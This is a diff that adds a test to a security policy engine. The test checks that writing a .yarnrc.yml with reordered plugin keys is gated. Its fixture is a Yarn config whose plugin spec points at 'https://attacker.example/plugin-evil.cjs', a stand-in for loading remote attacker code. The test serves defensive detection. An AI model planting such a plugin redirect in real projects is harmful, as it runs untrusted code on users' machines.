@@ -188,6 +188,21 @@ def test_write_yarnrc_yml_plugins_path_redirect_gated():
     assert _gated(d) and d.rule == RULE
 
 
+def test_write_yarnrc_yml_plugins_path_redirect_reordered_keys_gated():
+    # QA finding (independent adversarial review, round A): YAML key order is
+    # irrelevant to Yarn's own parser -- `spec:` written before `path:` in
+    # the same list entry loads and executes identically but the original
+    # regex, anchored to `path:` being the entry's first key, missed it
+    # entirely (a silent ALLOW). This is the reproduction that closed it.
+    content = (
+        "plugins:\n"
+        "  - spec: \"https://attacker.example/plugin-evil.cjs\"\n"
+        "    path: .yarn/plugins/plugin-evil.cjs\n"
+    )
+    d = evaluate(_write(".yarnrc.yml", content), EMPTY)
+    assert _gated(d) and d.rule == RULE
+
+
 def test_write_yarnrc_yml_without_redirect_keys_not_gated():
     d = evaluate(_write(".yarnrc.yml", "nodeLinker: node-modules\n"), EMPTY)
     assert d.action == Action.ALLOW
